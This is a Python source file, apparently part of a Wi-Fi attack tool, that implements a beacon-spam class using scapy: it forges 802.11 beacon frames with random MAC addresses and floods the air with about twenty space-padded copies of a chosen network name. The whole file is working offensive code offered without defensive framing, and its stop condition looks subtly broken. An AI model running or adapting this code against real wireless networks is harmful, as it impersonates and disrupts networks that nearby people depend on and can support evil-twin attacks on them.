import scapy.all as scapy
import globals
import time 
import threading
import random
class BeaconSpam:
    def __init__(self):
        self.IFACE = globals.interface
        self._stop_event = threading.Event()
    def stop(self):
        self._stop_event.set()
    def build_beacon_packet(self,ssid:str):
        packet = (
            scapy.RadioTap()/
            scapy.Dot11(type=0, subtype=8,
                addr1='ff:ff:ff:ff:ff:ff',  # Broadcast
                addr2=str(scapy.RandMAC()),
                addr3=str(scapy.RandMAC())) /
            scapy.Dot11Beacon(cap="ESS+privacy")/
            scapy.Dot11Elt(ID='SSID', info=str(ssid), len=len(ssid))/
            scapy.Dot11Elt(ID='RSNinfo', info=(
                b'\x01\x00'
                b'\x00\x0f\xac\x04'
                b'\x02\x00'
                b'\x00\x0f\xac\x04'
                b'\x00\x0f\xac\x02'
                b'\x01\x00'
                b'\x00\x0f\xac\x02'
                b'\x00\x00'))
        )
        return packet
    def create_ssid_array(self):
        ssids = []
        while len(ssids) < 20:
            random_num = random.randrange(0,30)
            random_space = " " * random_num
            new_ssid = globals.selected_ssid + random_space
            if new_ssid in ssids:
                pass
            else:
                ssids.append(new_ssid)
        return ssids
    def start_beacon_spam(self):
        ssids = self.create_ssid_array()
        while not self._stop_event.is_set() or not globals.larp_mode:
            try:
                for ssid in ssids:
                    pkt = self.build_beacon_packet(ssid)
                    scapy.sendp(pkt, iface=self.IFACE, verbose=False)
                    time.sleep(0.1)
            except Exception as e:
                time.sleep(0.1)                